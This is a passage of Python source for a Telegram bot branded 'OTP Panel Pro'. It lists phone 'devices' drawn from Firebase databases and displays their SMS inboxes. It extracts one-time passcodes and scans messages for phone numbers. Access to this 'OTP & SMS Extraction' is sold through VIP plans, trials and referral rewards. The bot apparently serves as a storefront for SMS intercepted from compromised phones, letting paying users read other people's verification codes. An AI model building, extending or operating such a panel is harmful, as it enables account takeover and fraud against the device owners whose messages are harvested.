    navigation = []
    if page: navigation.append(InlineKeyboardButton("◀ Prev", callback_data=f"page:{page - 1}"))
    navigation.append(InlineKeyboardButton(f"{page + 1}/{pages}", callback_data="noop"))
    if page < pages - 1: navigation.append(InlineKeyboardButton("Next ▶", callback_data=f"page:{page + 1}"))
    rows.append(navigation)

    online_toggle = "🌍 Show All" if user_online_filter.get(user_id, False) else "🟢 Online Only"
    toggle_data = "filter_all" if user_online_filter.get(user_id, False) else "filter_online"

    rows.append([
        InlineKeyboardButton("🔄 Refresh", callback_data="refresh_devices"),
        InlineKeyboardButton(online_toggle, callback_data=toggle_data),
    ])
    rows.append([InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")])
    return InlineKeyboardMarkup(rows)

async def show_devices(update: Update, page: int = 0, edit_query=None) -> None:
    user_id = update.effective_user.id
    devices = await all_devices(user_id)

    if user_online_filter.get(user_id, False):
        devices = [d for d in devices if d.status == "online"]

    if not devices:
        text = "📭 No devices match your current filters or panels."
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🌍 Reset Filters", callback_data="filter_all")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")],
        ])
        if edit_query: await edit_query.edit_message_text(text, reply_markup=kb)
        else: await update.message.reply_text(text, reply_markup=kb)
        return

    pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    user_page[user_id] = page

    online = sum(1 for item in devices if item.status == "online")
    text = (
        "📱 <b>Devices List</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"Online: <b>{online}</b>  |  Offline: <b>{len(devices) - online}</b>\n"
        f"Total: <b>{len(devices)}</b>  |  Page <b>{page + 1}/{pages}</b>\n\nSelect a device:"
    )

    if edit_query:
        await edit_query.edit_message_text(text, reply_markup=list_keyboard(devices, page, user_id), parse_mode="HTML")
    else:
        await update.message.reply_text(text, reply_markup=list_keyboard(devices, page, user_id), parse_mode="HTML")

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_chat.id if update.message else update.callback_query.message.chat_id
    if user_id not in ADMIN_IDS: return

    kb = [
        [InlineKeyboardButton("📡 Database & Panels", callback_data="admin_sub_dbs")],
        [InlineKeyboardButton("👥 User Management", callback_data="admin_sub_users")],
        [InlineKeyboardButton("🎟 Promos & Referrals", callback_data="admin_sub_promos")],
        [InlineKeyboardButton("📢 Channels & Broadcast", callback_data="admin_sub_comms")],
        [InlineKeyboardButton("⚙️ System & Stats", callback_data="admin_sub_system")],
        [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]
    ]
    text = "👑 <b>Admin Control Panel</b>\n\nSelect an administrative category below:"
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")


def render_user_lookup_card(target_id: int) -> Tuple[str, InlineKeyboardMarkup]:
    rec = user_record(target_id)
    is_vip = has_access(target_id)
    vip_status = "✅ Active VIP" if is_vip else "❌ Inactive / Expired"
    ban_status = "🚫 BANNED" if rec.get("banned") else "🟢 Clean"

    text = (
        "👤 <b>User Record Profile</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"<b>Name:</b> {html_escape(rec.get('name', 'Unknown'))}\n"
        f"<b>Username:</b> @{html_escape(rec.get('username') or 'N/A')}\n"
        f"<b>User ID:</b> <code>{target_id}</code>\n"
        f"<b>Account Status:</b> {ban_status}\n"
        f"<b>VIP Status:</b> {vip_status}\n"
        f"<b>Access Remaining:</b> {access_remaining(target_id)}\n"
        f"<b>Referrals Count:</b> {len(rec.get('referrals', []))}\n"
        f"<b>Referred By:</b> <code>{rec.get('referrer_id') or 'None'}</code>\n"
        f"<b>Custom Panels:</b> {len(rec.get('custom_dbs', []))}\n"
        f"<b>Joined Date:</b> {rec.get('joined_at', 'Unknown')}\n"
    )

    ban_btn = (
        InlineKeyboardButton("✅ Unban User", callback_data=f"admin_quick_unban:{target_id}")
        if rec.get("banned")
        else InlineKeyboardButton("🔨 Ban User", callback_data=f"admin_quick_ban:{target_id}")
    )

    kb = [
        [
            InlineKeyboardButton("🎁 Grant VIP", callback_data=f"admin_quick_grant:{target_id}"),
            InlineKeyboardButton("🚫 Revoke VIP", callback_data=f"admin_quick_revoke:{target_id}")
        ],
        [ban_btn],
        [InlineKeyboardButton("🔙 Back to User Management", callback_data="admin_sub_users")]
    ]
    return text, InlineKeyboardMarkup(kb)


# ---------------------------------------------------------------------------
# Command & Callback Handlers
# ---------------------------------------------------------------------------

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = update.effective_chat.id
    
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    record = user_record(user_id, user)
    register_referrer(user_id, context.args[0] if context.args else None)
    save_data()

    if not await ensure_channel_joined(update, context):
        return

    if not has_access(user_id):
        if not record.get("trial_used"):
            grant_trial(user_id)
            await update.message.reply_text(
                f"🎉 <b>Welcome! Free Trial Activated!</b>\n\n✅ You have been granted a <b>{TRIAL_MINUTES}-minute free trial</b>.\n⏱ <b>Time Remaining:</b> {access_remaining(user_id)}\n\nAfter your trial ends, invite friends or buy VIP access to continue!",
                reply_markup=menu(user_id), parse_mode="HTML",
            )
        else:
            await update.message.reply_text(
                f"⏰ <b>Trial Expired</b>\n\nInvite users to earn <b>{format_duration(referral_reward_minutes)} per referral</b> or purchase instant VIP access.",
                reply_markup=menu(user_id), parse_mode="HTML",
            )
        return

    await update.message.reply_text("✅ <b>Welcome to OTP Panel Pro!</b>\n\nChoose an option below:", reply_markup=menu(user_id), parse_mode="HTML")


async def cmd_referral(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_chat.id
    if is_banned(user_id): return
    if not await ensure_channel_joined(update, context): return
    await send_referral_menu(update.message, user_id)


async def cmd_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_chat.id
    if user_id not in ADMIN_IDS: return
    if not context.args:
        await update.message.reply_text("Usage: /revoke <user_id>")
        return
    try:
        target_id = int(context.args[0])
        if target_id in all_users or str(target_id) in all_users:
            record = user_record(target_id)
            record["access_until"] = 0.0
            record["trial_used"] = True
            save_data()
            await update.message.reply_text(f"✅ Access fully revoked for <code>{target_id}</code>.", parse_mode="HTML")
            try: await context.bot.send_message(target_id, "🚫 <b>Access Revoked</b>\n\nYour VIP access has been removed.", parse_mode="HTML")
            except TelegramError: pass
        else: await update.message.reply_text("❌ User not found in database.")
    except ValueError: await update.message.reply_text("❌ Invalid User ID.")


async def send_subscription_menu(target, edit: bool = False) -> None:
    text = (
        "💳 <b>VIP Subscription Plans</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"{vip_plans_text}\n\n"
        "✨ <b>VIP Privileges:</b>\n"
        "• Unlimited 24/7 Access (No referrals needed)\n"
        "• Instant Real-time OTP & SMS Extraction\n"
        "• Access to 100+ Global Device Databases\n"
        "• Priority Customer Support\n\n"
        "📩 <i>Click below to contact VIP support & activate access instantly:</i>"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("💬 Contact Only Support", url=f"https://t.me/{vip_support_handle}")],
        [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")],
    ])
    if edit: await target.edit_message_text(text, reply_markup=kb, parse_mode="HTML")
    else: await target.reply_text(text, reply_markup=kb, parse_mode="HTML")


async def send_referral_menu(target, user_id: int, edit: bool = False) -> None:
    text = (
        "🎁 <b>Refer & Earn Free Access</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"Your Successful Referrals: <b>{referral_count(user_id)}</b>\n"
        f"Reward Rate: <b>+{format_duration(referral_reward_minutes)} per friend invited</b>\n"
        f"Active Access Remaining: <b>{access_remaining(user_id)}</b>\n\n"
        "Share your unique invite link:\n"
        f"<code>{html_escape(referral_link(user_id))}</code>"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Share Referral Link", url=f"https://t.me/share/url?url={referral_link(user_id)}")],
        [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")],
    ])
    if edit: await target.edit_message_text(text, reply_markup=kb, parse_mode="HTML")
    else: await target.reply_text(text, reply_markup=kb, parse_mode="HTML")


async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.message.chat_id
    data = query.data or ""

    if is_banned(user_id):
        await query.answer("🚫 You are banned from using this bot.", show_alert=True)
        return

    # Clear pending actions on explicit menu navigation
    if data in ["back_to_main", "menu_admin", "menu_devices", "menu_search", "menu_buy_sub", "referral", "menu_account", "close"] or data.startswith("admin_sub_"):
        pending_action.pop(user_id, None)

    if data == "noop": return
    if data == "close":
        try: await query.message.delete()
        except TelegramError: pass
        return

    # Gate Verification (Verified Referral Trigger)
    if data == "verify_join":
        if not await ensure_channel_joined(update, context):
            return

        # Trigger verified referral bonus
        reward_awarded = complete_referral(user_id)
        if reward_awarded:
            rec = user_record(user_id)
            inviter = rec.get("referrer_id")
            if inviter:
                try:
                    await context.bot.send_message(
                        inviter,
                        f"🎉 <b>Referral Bonus!</b>\n\nYou received <b>{format_duration(referral_reward_minutes)}</b> of access for inviting {update.effective_user.full_name}!",
                        parse_mode="HTML"
                    )
                except TelegramError:
                    pass

        if has_access(user_id):
            await query.edit_message_text("✅ Verified! Choose an option:", reply_markup=menu(user_id))
        else:
            rec = user_record(user_id)
            if not rec.get("trial_used"):
                grant_trial(user_id)
                await query.edit_message_text(
                    f"🎉 <b>Welcome! Free Trial Activated!</b>\n\n✅ You have been granted a <b>{TRIAL_MINUTES}-minute free trial</b>.\n⏱ <b>Time Remaining:</b> {access_remaining(user_id)}\n\nAfter your trial ends, invite friends or buy VIP access to continue!",
                    reply_markup=menu(user_id),
                    parse_mode="HTML"
                )
            else:
                await send_referral_menu(query, user_id, edit=True)
        return

    if not await ensure_channel_joined(update, context): return

    # Main Navigation
    if data == "back_to_main":
        await query.edit_message_text("✅ <b>Main Menu</b>\n\nChoose an option below:", reply_markup=menu(user_id), parse_mode="HTML")
        return
    if data == "menu_devices":
        if not has_access(user_id): return await send_subscription_menu(query, edit=True)
        await show_devices(update, 0, query)
        return
    if data == "menu_search":
        if not has_access(user_id): return await send_subscription_menu(query, edit=True)
        pending_action[user_id] = "search_number"
        await query.message.reply_text("🔍 Send the number or part of the number to search:")
        return
    if data == "menu_buy_sub":
        await send_subscription_menu(query, edit=True)
        return
    if data == "referral":
        await send_referral_menu(query, user_id, edit=True)
        return
    if data == "user_redeem_promo":
        pending_action[user_id] = "user_redeem_promo"
        await query.edit_message_text("🎟 <b>Redeem Promo Code</b>\n\nEnter your gift code below:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="back_to_main")]]), parse_mode="HTML")
        return
    if data == "menu_admin":
        await admin_panel(update, context)
        return
    if data == "menu_account":
        status = "✅ Active VIP" if has_access(user_id) else "❌ Expired / Locked"
        pref = user_record(user_id).get("selected_panel", "ALL")
        text = (
            "👤 <b>Account Profile</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"User ID: <code>{user_id}</code>\n"
            f"Status: <b>{status}</b>\n"
            f"Access Remaining: <b>{access_remaining(user_id)}</b>\n"
            f"Active Panel Mode: <b>{pref}</b>\n"
            f"Total Referrals: <b>{referral_count(user_id)}</b>\n\n"
            "<i>Invite friends or buy a VIP pass to extend your access time!</i>"
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 Buy VIP Pass", callback_data="menu_buy_sub")],
            [InlineKeyboardButton("🎁 Refer & Earn", callback_data="referral")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")],
        ])
        await query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")
        return

    # Filter & Pagination
    if data == "filter_online":
        user_online_filter[user_id] = True
        await show_devices(update, user_page.get(user_id, 0), query)
        return
    if data == "filter_all":
        user_online_filter[user_id] = False
        await show_devices(update, user_page.get(user_id, 0), query)
        return
    if data == "refresh_devices":
        await refresh_all_devices()
        await show_devices(update, user_page.get(user_id, 0), query)
        return
    if data.startswith("page:"):
        await show_devices(update, int(data.split(":")[1]), query)
        return

    # User Panel Management
    if data == "user_add_panel":
        pending_action[user_id] = "user_add_panel"
        await query.edit_message_text("➕ <b>Add Custom Panel</b>\n\nSend your Firebase Realtime Database URL (http/https):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="back_to_main")]]), parse_mode="HTML")
        return
    if data == "user_switch_panel":
        kb = [
            [InlineKeyboardButton("🌍 All Panels (Global + Mine)", callback_data="set_panel:ALL")],
            [InlineKeyboardButton("🌐 Global Panels Only", callback_data="set_panel:GLOBAL")],
            [InlineKeyboardButton("🔒 My Custom Panels Only", callback_data="set_panel:CUSTOM")],
            [InlineKeyboardButton("🗑 Clear My Panels", callback_data="user_clear_panels")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")],
        ]
        await query.edit_message_text("🔄 <b>Switch Panel Source</b>\n\nChoose which panels to view numbers from:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return
    if data == "user_clear_panels":
        record = user_record(user_id)
        record["custom_dbs"] = []
        record["selected_panel"] = "ALL"
        save_data()
        await query.edit_message_text("🗑 <b>Custom Panels Cleared!</b>\n\nYour personal Firebase URLs have been removed.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]]), parse_mode="HTML")
        return
    if data.startswith("set_panel:"):
        record = user_record(user_id)
        record["selected_panel"] = data.split(":")[1]
        save_data()
        await query.edit_message_text(f"✅ <b>Panel Updated!</b>\n\nYou are now viewing: <b>{record['selected_panel']}</b>.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]]), parse_mode="HTML")
        return

    # Device & SMS Viewers
    if data.startswith("device:") or data.startswith("refresh_sms:"):
        dev_id = data.split(":", 1)[1]
        device = next((item for items in global_device_cache.values() for item in items if item.id == dev_id), None)
        if not device:
            await query.edit_message_text("Device no longer available.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]))
            return

        latest_sms_list = await get_device_sms(device, 1)
        latest_sms = latest_sms_list[0] if latest_sms_list else None
        
        sms_section = "\n━━━━━━━━━━━━━━━━━━\n📭 No SMS found."
        if latest_sms:
            body = latest_sms.get("body") or latest_sms.get("message") or latest_sms.get("text") or ""
            otp = extract_otp(body)
            otp_line = f"🔑 OTP: <code>{otp}</code>\n" if otp else ""
            sms_section = (
                f"\n━━━━━━━━━━━━━━━━━━\n📩 <b>Latest SMS</b>\n"
                f"👤 From: {html_escape(latest_sms.get('sender','Unknown'))}\n"
                f"📅 Date: {sms_date(latest_sms)}\n"
                f"{otp_line}"
                f"💬 {html_escape(body[:200])}..."
            )

        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Refresh SMS", callback_data=f"refresh_sms:{dev_id}")],
            [
                InlineKeyboardButton("📩 Last 10 SMS", callback_data=f"msgs:{dev_id}"),
                InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{dev_id}"),
            ],
            [InlineKeyboardButton("🔙 Back to List", callback_data=f"page:{user_page.get(user_id, 0)}")],
        ])
        await query.edit_message_text(
            f"📱 <b>Device Details</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Number: <code>{html_escape(device_label(device))}</code>\n"
            f"Status: {'🟢 Online' if device.status == 'online' else '🔴 Offline'}\n"
            f"Source: {html_escape(device.db_tag)}{sms_section}",
            reply_markup=kb, parse_mode="HTML",
        )
        return

    if data.startswith("info:"):
        dev_id = data.split(":", 1)[1]
        device = next((item for items in global_device_cache.values() for item in items if item.id == dev_id), None)
        if not device: return
        kb = [[InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("🔙 Back", callback_data=f"device:{dev_id}")]]
        await query.edit_message_text(
            f"📱 <b>Device Specifications</b>\n\nModel: {device.name}\nID: {device.id}\nBattery: {device.battery}%\nStatus: {device.status}\n\nDetails:\n{html_escape(device.device_info)}",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML",
        )
        return

    if data.startswith("msgs:"):
        dev_id = data.split(":", 1)[1]
        device = next((item for items in global_device_cache.values() for item in items if item.id == dev_id), None)
        if not device: return
        sms_list = await get_device_sms(device, limit=SMS_LIMIT)
        if not sms_list:
            await query.edit_message_text("📭 No SMS found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=f"device:{dev_id}")]]))
            return

        parts, otp_buttons = [], []
        for sms in sms_list:
            block, otp = format_sms_block(sms, device_label(device))
            parts.append(block)
            if otp: otp_buttons.append(InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}"))

        otp_buttons.append(InlineKeyboardButton("🔙 Back to Device", callback_data=f"device:{dev_id}"))
        markup = InlineKeyboardMarkup([otp_buttons[i : i + 2] for i in range(0, len(otp_buttons), 2)])
        await query.edit_message_text("\n━━━━━━━━━━━━━━━━━━\n\n".join(parts)[:4000], reply_markup=markup, parse_mode="HTML")
        return

    if data.startswith("cp:"):
        await query.answer(f"OTP: {data[3:]}", show_alert=True)
        return

    # Deep SMS Scanner
    if data == "menu_scan_hidden":
        await query.edit_message_text("📡 <b>Scanning for hidden numbers in SMS bodies...</b>", parse_mode="HTML")
        devices = await all_devices(user_id)
        target = [d for d in devices if not d.numbers]
        phone_pattern = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
        results, kb = [], []

        for d in target[:25]:
            smss = await get_device_sms(d, limit=10)
            found = set()
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                found.update(phone_pattern.findall(body))
            if found:
                results.append(f"• {html_escape(d.name)} -> {', '.join(found)}")
                if len(kb) < 8: kb.append([InlineKeyboardButton(f"Inbox: {list(found)[0][:6]}...", callback_data=f"msgs:{d.id}")])

        kb.append([InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")])
        if results: await query.edit_message_text("📡 <b>Hidden Numbers Extracted:</b>\n\n" + "\n".join(results), reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        else: await query.edit_message_text("📭 No hidden numbers detected in recent SMS records.", reply_markup=InlineKeyboardMarkup(kb))
        return

    # ── Admin Sub-Menus & Actions ───────────────────────────────────
    if user_id not in ADMIN_IDS: return

    # 1. Databases & Panels Submenu
    if data == "admin_sub_dbs":
        kb = [
            [InlineKeyboardButton("➕ Add Global DB", callback_data="admin_add_db"), InlineKeyboardButton("➖ Remove Global DB", callback_data="admin_remove_db")],
            [InlineKeyboardButton("📤 Export User Panels", callback_data="admin_export_user_panels")],
            [InlineKeyboardButton("💾 Export DB (JSON Backup)", callback_data="admin_export_db")],
            [InlineKeyboardButton("📂 Import DB (JSON Restore)", callback_data="admin_import_db")],
            [InlineKeyboardButton("🔙 Back to Admin", callback_data="menu_admin")]
        ]
        await query.edit_message_text("📡 <b>Database & Panels Management</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return
        
    # 2. User Management Submenu
    if data == "admin_sub_users":
        kb = [
            [InlineKeyboardButton("🔍 Lookup / Search User", callback_data="admin_lookup_user")],
            [InlineKeyboardButton("🎁 Grant VIP", callback_data="admin_grant_vip"), InlineKeyboardButton("🚫 Revoke VIP", callback_data="admin_revoke_vip")],
            [InlineKeyboardButton("🔨 Ban User", callback_data="admin_ban_user"), InlineKeyboardButton("✅ Unban User", callback_data="admin_unban_user")],
            [InlineKeyboardButton("🔙 Back to Admin", callback_data="menu_admin")]
        ]
        await query.edit_message_text("👥 <b>User Access & Restrictions</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return
        
    # 3. Promos & Referrals Submenu
    if data == "admin_sub_promos":
        kb = [
            [InlineKeyboardButton("🎟 Create Promo Code", callback_data="admin_create_promo"), InlineKeyboardButton("🎟 List Promos", callback_data="admin_list_promos:0")],
            [InlineKeyboardButton("⚙️ Set Refer Reward", callback_data="admin_set_refer_time"), InlineKeyboardButton("💳 Set VIP Plans", callback_data="admin_set_vip_plans")],
            [InlineKeyboardButton("👤 Set VIP Support Contact", callback_data="admin_set_vip_support")],
            [InlineKeyboardButton("🔙 Back to Admin", callback_data="menu_admin")]
        ]
        await query.edit_message_text("🎟 <b>Promos, Subscriptions & Referrals</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return
        
    if data == "admin_set_vip_support":
        pending_action[user_id] = "set_vip_support"
        await query.edit_message_text(
            f"👤 <b>Set VIP Support Admin Handle</b>\n\n"
            f"Current VIP Support: <code>@{vip_support_handle}</code>\n\n"
            "Send the new Telegram username (e.g. <code>@VipAdminBot</code> or <code>VipSalesAdmin</code>):",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_promos")]]),
            parse_mode="HTML"
        )
        return

    # 4. Channels & Comms Submenu
    if data == "admin_sub_comms":
        kb = [
            [InlineKeyboardButton("📢 Manage Required Channels", callback_data="admin_manage_channels")],
            [InlineKeyboardButton("📣 Broadcast Message", callback_data="admin_broadcast")],
            [InlineKeyboardButton("🔙 Back to Admin", callback_data="menu_admin")]
        ]
        await query.edit_message_text("📢 <b>Channels & Communications</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return
        
    # 5. System & Stats Submenu
    if data == "admin_sub_system":
        kb = [
            [InlineKeyboardButton("📊 Bot Statistics", callback_data="admin_stats")],
            [InlineKeyboardButton("📥 Export Online Numbers", callback_data="admin_export_nums")],
            [InlineKeyboardButton("👑 Manage Admins", callback_data="admin_manage_admins")],
            [InlineKeyboardButton("🔙 Back to Admin", callback_data="menu_admin")]
        ]
        await query.edit_message_text("⚙️ <b>System Operations</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return

    # User Search & Management Actions
    if data == "admin_lookup_user":
        pending_action[user_id] = "admin_lookup_user"
        await query.edit_message_text(
            "🔍 <b>User Search & Lookup</b>\n\n"
            "Send one of the following to look up a user record:\n"
            "• Numeric <b>User ID</b> (e.g. <code>123456789</code>)\n"
            "• <b>@username</b> (e.g. <code>@john_doe</code>)\n"
            "• <b>Forward a message</b> from the user",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_users")]]),
            parse_mode="HTML"
        )
        return

    if data.startswith("admin_quick_ban:"):
        tid = int(data.split(":")[1])
        user_record(tid)["banned"] = True
        save_data()
        await query.answer(f"User {tid} banned.", show_alert=True)
        txt, kb = render_user_lookup_card(tid)
        await query.edit_message_text(txt, reply_markup=kb, parse_mode="HTML")
        return

    if data.startswith("admin_quick_unban:"):
        tid = int(data.split(":")[1])
        user_record(tid)["banned"] = False
        save_data()
        await query.answer(f"User {tid} unbanned.", show_alert=True)
        txt, kb = render_user_lookup_card(tid)
        await query.edit_message_text(txt, reply_markup=kb, parse_mode="HTML")
        return

    if data.startswith("admin_quick_revoke:"):
        tid = int(data.split(":")[1])
        rec = user_record(tid)
        rec["access_until"] = 0.0
        rec["trial_used"] = True
        save_data()
        await query.answer(f"VIP revoked from {tid}.", show_alert=True)
        try: await context.bot.send_message(tid, "🚫 <b>Access Revoked</b>\n\nYour VIP access has been removed.", parse_mode="HTML")
        except TelegramError: pass
        txt, kb = render_user_lookup_card(tid)
        await query.edit_message_text(txt, reply_markup=kb, parse_mode="HTML")
        return

    if data.startswith("admin_quick_grant:"):
        tid = int(data.split(":")[1])
        pending_data[user_id] = {"target_vip_user": tid}
        pending_action[user_id] = "admin_grant_vip_days"
        await query.edit_message_text(f"🎁 How many <b>days</b> of VIP access for <code>{tid}</code>?", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_users")]]), parse_mode="HTML")
        return

    if data == "admin_ban_user":
        pending_action[user_id] = "admin_ban_user_id"
        await query.edit_message_text("🔨 <b>Ban User</b>\n\nSend the User ID to ban:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_users")]]), parse_mode="HTML")
        return
    if data == "admin_unban_user":
        pending_action[user_id] = "admin_unban_user_id"
        await query.edit_message_text("✅ <b>Unban User</b>\n\nSend the User ID to unban:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_users")]]), parse_mode="HTML")
        return
    if data == "admin_grant_vip":
        pending_action[user_id] = "admin_grant_vip_userid"
        await query.edit_message_text("🎁 <b>Grant VIP Access</b>\n\nSend the <b>User ID</b>:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_users")]]), parse_mode="HTML")
        return
    if data == "admin_revoke_vip":
        pending_action[user_id] = "admin_revoke_vip_userid"
        await query.edit_message_text("🚫 <b>Revoke VIP / Access</b>\n\nSend the <b>User ID</b>:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_users")]]), parse_mode="HTML")
        return

    # DB & Panel Actions
    if data == "admin_export_db":
        save_data()
        filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M')}.json"
        await context.bot.send_document(user_id, document=open(DB_FILE, "rb"), filename=filename, caption="Here is your complete database backup.")
        return
    if data == "admin_import_db":
        pending_action[user_id] = "admin_import_db"
        await query.edit_message_text("📂 <b>Import Database</b>\n\nPlease send the <code>.json</code> database backup file directly in this chat to restore it.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_dbs")]]), parse_mode="HTML")
        return
    if data == "admin_add_db":
        pending_action[user_id] = "admin_add_db"
        await query.edit_message_text("➕ <b>Add Global Firebase</b>\n\nSend the new URL:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_dbs")]]), parse_mode="HTML")
        return
    if data == "admin_remove_db":
        kb = [[InlineKeyboardButton(f"❌ Remove {tag}", callback_data=f"admin_del_db:{tag}")] for tag in DATABASES]
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_sub_dbs")])
        await query.edit_message_text("➖ <b>Remove Global Firebase</b>\n\nSelect a database to delete:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return
    if data.startswith("admin_del_db:"):
        tag = data.split(":")[1]
        if tag in DATABASES:
            del DATABASES[tag]
            save_data()
            await query.answer(f"Deleted {tag}", show_alert=True)
            kb = [[InlineKeyboardButton(f"❌ Remove {t}", callback_data=f"admin_del_db:{t}")] for t in DATABASES]
            kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_sub_dbs")])
            await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(kb))
        return
    if data == "admin_export_user_panels":
        lines = ["📤 USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n"]
        has_panels = False
        for uid, uinfo in all_users.items():
            dbs = uinfo.get("custom_dbs", [])
            if dbs:
                has_panels = True
                lines.append(f"User {uid}:")
                for db in dbs: lines.append(f"  - {db}")
                lines.append("")
        if not has_panels:
            return await query.answer("No custom user panels found.", show_alert=True)
        filename = "User_Custom_Panels.txt"
        with open(filename, "w", encoding="utf-8") as f: f.write("\n".join(lines))
        await context.bot.send_document(user_id, document=open(filename, "rb"), filename=filename, caption="User submitted panels.")
        os.remove(filename)
        return

    # Promo Actions (Paginated & Multi-Use)
    if data == "admin_create_promo":
        pending_action[user_id] = "admin_create_promo"
        await query.edit_message_text(
            "🎟 <b>Create Promo Code</b>\n\n"
            "Send format: <code>CODE DAYS [USES]</code>\n\n"
            "<i>Examples:</i>\n"
            "• <code>SUMMER50 30 50</code> (30 days VIP, usable by 50 users)\n"
            "• <code>GIFT7 7 1</code> (7 days VIP, single use)",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_promos")]]),
            parse_mode="HTML"
        )
        return

    if data.startswith("admin_list_promos"):
        if not promo_codes:
            await query.answer("No active promo codes.", show_alert=True)
            return

        parts = data.split(":")
        page = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0

        items_per_page = 10
        promo_list = list(promo_codes.items())
        total_pages = max(1, (len(promo_list) + items_per_page - 1) // items_per_page)
        page = max(0, min(page, total_pages - 1))

        kb = []
        for code, pdata in promo_list[page * items_per_page : (page + 1) * items_per_page]:
            d = pdata.get("days", 0) if isinstance(pdata, dict) else pdata
            u = pdata.get("uses_left", 1) if isinstance(pdata, dict) else 1
            kb.append([InlineKeyboardButton(f"❌ Del {code} ({d}d | {u} left)", callback_data=f"admin_del_promo:{code}:{page}")])

        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("◀ Prev", callback_data=f"admin_list_promos:{page - 1}"))
        nav.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="noop"))
        if page < total_pages - 1:
            nav.append(InlineKeyboardButton("Next ▶", callback_data=f"admin_list_promos:{page + 1}"))

        if nav:
            kb.append(nav)
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_sub_promos")])
        await query.edit_message_text("🎟 <b>Active Promo Codes</b>\n\nClick to delete:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return

    if data.startswith("admin_del_promo:"):
        parts = data.split(":")
        code = parts[1]
        page = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
        if code in promo_codes:
            del promo_codes[code]
            save_data()
            await query.answer(f"Deleted promo {code}", show_alert=True)

        if not promo_codes:
